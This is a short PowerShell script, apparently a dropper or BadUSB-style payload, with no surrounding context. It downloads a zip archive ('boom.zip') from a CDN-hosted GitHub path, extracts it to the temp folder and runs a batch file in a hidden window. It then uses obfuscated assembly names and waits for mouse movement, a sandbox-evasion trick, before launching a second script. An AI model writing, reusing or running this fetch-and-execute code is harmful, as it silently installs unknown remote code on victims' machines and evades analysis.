[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
Invoke-WebRequest https://cdn.statically.io/gh/l4l4l4l4ll/files/68579cbd7c56f7a4606e97bd234ae4a3c5d79f45/loud/boom.zip -OutFile $env:temp\boom.zip
Expand-Archive -Force -Path $env:temp\boom.zip -DestinationPath $env:temp\boom
Start-Process -FilePath "$env:temp/boom/boom.bat" -WindowStyle Hidden
powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 1}};powershell $env:temp\boom\boom2.ps1